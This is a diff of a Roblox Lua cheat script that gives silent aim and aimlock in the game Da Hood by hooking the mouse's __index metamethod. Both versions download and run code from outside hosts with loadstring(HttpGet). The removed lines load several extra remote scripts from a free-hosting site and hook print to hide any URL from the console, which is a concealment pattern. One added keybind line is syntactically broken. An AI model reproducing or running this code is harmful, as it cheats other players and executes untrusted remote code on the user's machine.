@@ -1,92 +1,106 @@
 
- ___________   _______        ____        ________   ________      ______  ________ ___________  ____
+___________   _______        ____        ________   ________      ______  ________ ___________  ____
 |___     ___| |   __  \      / __ \      /  ______| |   _____|    |  __  }|  ______|___     ___|/ __ \
     |   |     |  |__) /     / /__\ \    |  /        |  |____      |      }| |____      |   |   / /__\ \
     |   |     |   ,  \     /  ____  \   |  |        |   ____|     |  __  \|  ____|     |   |  /  ____  \
     |   |     |   |\  \   /  /    \  \  |  \______  |  |_____     | |__)  | |______    |   | /  /    \  \
     |___|     |___| \__) /__/      \__\  \________| |________|    |______/|________|   |___|/__/      \__\
 
+                                local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/staxlol/Friends/main/Main", true))()
+                            Aiming.TeamCheck(false)
+                             
+                            
+                            local Workspace = game:GetService("Workspace")
+                            local Players = game:GetService("Players")
+                            local RunService = game:GetService("RunService")
+                            local UserInputService = game:GetService("UserInputService")
+                            
+                            
+                            local LocalPlayer = Players.LocalPlayer
+                            local Mouse = LocalPlayer:GetMouse()
+                            local CurrentCamera = Workspace.CurrentCamera
+                            
+                            local DaHoodSettings = {
+                                SilentAim = true,
+                                AimLock = false,
+                                Prediction = 0.14,
+                                AimLockKeybind = Enum.KeyCode.";"
+                            }
+                            getgenv().DaHoodSettings = DaHoodSettings
+                            
+                            
+                            function Aiming.Check()
+                            -------------
+                                if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
+                                    return false
+                                end
+                            
+                                -- // Check if downed
+                                local Character = Aiming.Character(Aiming.Selected)
+                                local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
+                                local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
+                            
+                                -- // Check B
+                                if (KOd or Grabbed) then
+                                    return false
+                                end
+                            
+                                -- //
+                                return true
+                            end
+                            
+                            -- // Hook
+                            local __index
+                            __index = hookmetamethod(game, "__index", function(t, k)
+                                -- // Check if it trying to get our mouse's hit or target and see if we can use it
+                                if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
+                                    local SelectedPart = Aiming.SelectedPart
+                            
+                                    -- // Hit/Target
+                                    if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
+                                        -- // Hit to account prediction
+                                        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+                            
+                                        -- // Return modded val
+                                        return (k == "Hit" and Hit or SelectedPart)
+                                    end
+                                end
+                            
+                                -- // Return
+                                return __index(t, k)
+                            end)
+                            local player = game.Players.LocalPlayer
+local mouse = player:GetMouse()
+
+mouse.KeyDown:Connect(function(key)
+
+    if key == "k" then
+        
 
 
+        if DaHoodSettings.SilentAim == false then
+        
+        DaHoodSettings.SilentAim = true
+        
+        else
+            
+        DaHoodSettings.SilentAim = false
 
-
-
-
-
-
-local Aiming = loadstring(game:HttpGet("https://raw.githubusercontent.com/staxlol/Friends/main/Main"))()
-Aiming.TeamCheck(false)
-
-local Workspace = game:GetService("Workspace")
-local Players = game:GetService("Players")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
-
-local LocalPlayer = Players.LocalPlayer
-local Mouse = LocalPlayer:GetMouse()
-local CurrentCamera = Workspace.CurrentCamera
-loadstring(game:HttpGet("https://raw.githubusercontent.com/daboyszzzzz/xxx/main/zz"))()
-loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/blacklist.lua"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/AdoptMeAutoFarm/AdoptMeV2Gui/main/xxx"))()
-loadstring(game:HttpGet("https://adoptmescriptxyz.000webhostapp.com/resolver.lua"))()
-game:GetService("StarterGui"):SetCore("SendNotification", {Title = "for friends bc they ass", Text = "made by xe#0001 & volends
-#0808", Duration = 4,});
-
-
-local DaHoodSettings = {
-    SilentAim = true,
-    AimLock = false,
-    Prediction = 0.14,
-    AimLockKeybind = Enum.KeyCode.E
-}
-getgenv().DaHoodSettings = DaHoodSettings
-
-function Aiming.Check()
-    if not (Aiming.Enabled == true and Aiming.Selected ~= LocalPlayer and Aiming.SelectedPart ~= nil) then
-        return false
-    end
-
-    local Character = Aiming.Character(Aiming.Selected)
-    local KOd = Character:WaitForChild("BodyEffects")["K.O"].Value
-    local Grabbed = Character:FindFirstChild("GRABBING_CONSTRAINT") ~= nil
-
-    if (KOd or Grabbed) then
-        return false
-    end
-
-    return true
-end
-
-local __index
-__index = hookmetamethod(game, "__index", function(t, k)
-    if (t:IsA("Mouse") and (k == "Hit" or k == "Target") and Aiming.Check()) then
-        local SelectedPart = Aiming.SelectedPart
-
-        if (DaHoodSettings.SilentAim and (k == "Hit" or k == "Target")) then
-            local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
-
-            return (k == "Hit" and Hit or SelectedPart)
         end
+
     end
 
-    return __index(t, k)
+
 end)
-
-RunService:BindToRenderStep("AimLock", 0, function()
-    if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
-        local SelectedPart = Aiming.SelectedPart
-
-        local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
-
-        CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
-    end
-    end)
-
-local denied_message = "Denied Goofy"
-local g
-g = hookfunction(print,function(urprint,...)
-   if string.match(urprint, "HTTP") or string.match(urprint, "http") or string.match(urprint, ".com") or string.match(urprint, "Http") or string.match(urprint, "Paste") or string.match(urprint, "bin") or string.match(urprint, "gitusercontent") or string.match(urprint, "git") then
-       urprint = denied_message
-   end
- return g(urprint,...)
-end)
+                            -- // Aimlock
+                            RunService:BindToRenderStep("AimLock", 0, function()
+                                if (DaHoodSettings.AimLock and Aiming.Check() and UserInputService:IsKeyDown(DaHoodSettings.AimLockKeybind)) then
+                                    -- // Vars
+                                    local SelectedPart = Aiming.SelectedPart
+                            
+                                    -- // Hit to account prediction
+                                    local Hit = SelectedPart.CFrame + (SelectedPart.Velocity * DaHoodSettings.Prediction)
+                            
+                                    CurrentCamera.CFrame = CFrame.lookAt(CurrentCamera.CFrame.Position, Hit.Position)
+                                end
+                                end)
